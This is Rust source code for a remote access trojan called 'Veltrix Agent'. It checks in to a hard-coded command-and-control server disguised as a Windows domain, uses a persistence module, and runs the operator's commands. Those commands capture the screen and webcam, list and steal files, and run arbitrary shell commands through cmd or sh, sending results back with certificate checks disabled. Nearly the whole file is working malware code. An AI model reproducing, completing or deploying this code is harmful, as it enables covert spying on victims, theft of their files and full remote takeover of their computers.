// Veltrix Agent v0.2
// Screen capture, camera, file manager, shell execution

use std::{thread, time::Duration, process::Command};

const C2_URL: &str = "https://windowssys.hidenmc.com/1";
const USER_ID: u32 = 1;
const RECONNECT_DELAY: u64 = 5;
const MUTEX_NAME: &str = "VeltrixAgent";

mod persistence;
mod screen;
mod camera;
mod filemanager;

fn main() {
    let _lock = single_instance::SingleInstance::new(MUTEX_NAME)
        .expect("Another instance is already running");

    println!("[*] Veltrix agent v0.2 starting...");
    println!("[*] C2: {}", C2_URL);
    println!("[*] User ID: {}", USER_ID);

    loop {
        match check_in() {
            Ok(cmd) => {
                if !cmd.trim().is_empty() {
                    let result = handle_command(&cmd);
                    let _ = send_result(&cmd, &result);
                    println!("[>] {}", cmd);
                    println!("[<] {}...", &result[..result.len().min(200)]);
                }
            }
            Err(e) => {
                eprintln!("[!] Check-in failed: {}", e);
            }
        }
        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
    }
}

fn handle_command(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
    let action = parts[0];
    let arg = parts.get(1).copied().unwrap_or("");

    match action {
        "screenshot" => {
            let quality: u8 = arg.parse().unwrap_or(75);
            match screen::capture_screen_b64(quality) {
                Ok(b64) => format!("SCREEN:{}", b64),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "camera" => {
            let quality: u8 = arg.parse().unwrap_or(75);
            match camera::capture_camera_b64(quality) {
                Ok(b64) => format!("CAMERA:{}", b64),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "ls" => {
            let path = if arg.is_empty() { "C:\\" } else { arg };
            match filemanager::list_dir(path) {
                Ok(json) => format!("FILES:{}", json),
                Err(e) => format!("ERROR:{}", e),
            }
        }
        "download" => {
            if arg.is_empty() {
                "ERROR:No file path specified".to_string()
            } else {
                match filemanager::read_file_b64(arg) {
                    Ok(b64) => format!("FILE:{}:{}", arg, b64),
                    Err(e) => format!("ERROR:{}", e),
                }
            }
        }
        _ => {
            // Default: shell execution
            execute_shell(cmd)
        }
    }
}

fn execute_shell(cmd: &str) -> String {
    #[cfg(windows)]
    {
        match Command::new("cmd").args(&["/C", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
    #[cfg(not(windows))]
    {
        match Command::new("sh").args(&["-c", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
}

fn check_in() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let resp = client
        .get(&format!("{}/checkin", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .header("X-Hostname", hostname())
        .header("X-OS", std::env::consts::OS)
        .send()?;
    Ok(resp.text()?)
}

fn send_result(cmd: &str, result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    client
        .post(&format!("{}/result", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .header("Content-Type", "application/json")
        .body(serde_json::json!({ "command": cmd, "result": result }).to_string())
        .send()?;
    Ok(())
}

fn machine_id() -> String {
    machine_uid::get().unwrap_or_else(|_| "unknown".to_string())
}

fn hostname() -> String {
    #[cfg(windows)]
    { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string()) }
    #[cfg(not(windows))]
    { std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string()) }
}
